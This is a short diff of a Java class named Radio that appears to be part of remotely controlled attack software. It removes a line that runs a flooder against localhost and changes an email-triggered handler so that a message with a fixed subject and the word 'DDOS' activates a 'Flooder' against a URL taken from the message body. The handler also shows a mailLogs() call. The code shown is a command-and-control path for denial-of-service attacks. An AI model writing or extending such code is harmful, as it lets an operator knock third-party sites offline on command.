@@ -189,7 +189,6 @@ public class Radio
 	@SuppressWarnings("static-access")
 	public static void main (String[] args) throws IOException, URISyntaxException
 	{
-		ddoschan.run("127.0.0.1", 80, 1000);
 		a = new Astatine();
 		AlphaDecay = new Thread(a);
 		Chocolat.println("[" + m.robert.elapsedTime() + "] Starting a new thread for you...");
@@ -546,7 +545,7 @@ public class Radio
 			        	 mailLogs();
 			         }
 			         
-			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().contains("DDOS")) {
+			         else if (message.getSubject().matches("Nom d'un chien.") && message.getContent().toString().contains("DDOS")) {
 			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Flooder activated.");
 			        	 StringTokenizer st = new StringTokenizer(message.getContent().toString());
 			        	 String url = st.nextToken();
